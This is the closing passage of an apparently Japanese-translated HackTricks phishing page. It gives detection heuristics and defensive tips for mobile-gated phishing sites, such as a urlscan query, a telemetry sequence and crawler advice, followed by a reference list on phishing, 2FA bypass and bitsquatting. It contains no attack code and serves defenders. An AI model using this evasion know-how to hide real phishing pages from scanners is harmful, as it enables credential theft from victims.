ハンティングおよび検出のヒューリスティック:
- urlscanクエリ: `filename:"detect_device.js" AND page.status:500`
- Webテレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非モバイルの場合はHTTP 500というシーケンス。正規のモバイル被害者向けパスでは、後続のHTML/JSを伴う200が返される。
- `ontouchstart` または類似のデバイスチェックだけを条件にコンテンツを提供するページをブロックまたは精査する。

防御のヒント:
- モバイルに似たフィンガープリントと有効なJSを使用してクローラーを実行し、ゲートされたコンテンツを明らかにする。
- 新規登録ドメインで、`POST /detect` に続いて不審な500レスポンスが発生した場合にアラートを出す。

## References

- [1] [フィッシングで使用されるドメインバリエーションの生成 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [フィッシングの発見: ツールとテクニック (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [認証情報を窃取し、noVNCを使用して2FAをバイパスする (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian WheezyでPostfixを使用してDKIMをインストールおよび設定する方法 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report - ソーシャルエンジニアリング編](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [サイレントSmishing - モバイルでゲートされたフィッシングインフラストラクチャとヒューリスティック (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacksの次なるフロンティア: LLMを活用したリアルタイムでのフィッシングJavaScript生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [なりすまし、クリックハイジャック、TDS: マルウェア配布エコシステムの内部](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.comのBitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [bitflippingによるMicrosoftのwindows.comへのトラフィックハイジャック (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: パキスタンで標的型spyware campaignの誘い文句として使用された偽のdating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChatのIoCとサンプル](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
